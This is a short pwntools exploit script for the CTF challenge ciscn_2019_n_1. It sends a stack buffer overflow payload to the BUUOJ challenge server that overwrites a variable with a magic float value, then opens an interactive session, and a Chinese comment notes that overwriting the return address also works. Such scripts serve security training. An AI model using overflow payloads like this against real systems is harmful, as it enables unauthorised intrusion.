#Made by fly_autumn
#ret2text x64
from pwn import *
p = remote("node5.buuoj.cn",26429)#p = process("./ciscn_2019_n_1")

offset = 0x30 - 4
shell_addr = 0x4006be
payload = b"\x00" * offset + p64(0x41348000)
p.sendline(payload)
p.interactive()
#这是其中一种写法，其实也可以覆盖地址的说